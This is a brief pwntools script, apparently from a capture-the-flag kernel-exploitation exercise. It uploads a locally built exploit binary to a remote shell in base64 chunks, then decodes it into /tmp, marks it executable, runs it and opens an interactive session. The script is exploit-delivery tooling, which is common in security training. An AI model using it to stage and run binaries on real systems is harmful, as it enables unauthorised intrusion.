# 远程传输脚本，可能较慢请耐心等待:)
# exp需要静态编译，建议用musl-gcc
from pwn import *
import base64

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("1.1.4.5", 14)
try_count = 1
while True:
    p.sendline()
    p.recvuntil("/ $")

    count = 0
    for i in range(0, len(exp), 0x200):
        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
        count += 1
        log.info("count: " + str(count))

    for i in range(count):
        p.recvuntil("/ $")
    
    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exp")
    p.sendline("chmod +x /tmp/exp")
    p.sendline("/tmp/exp ")
    break

p.interactive()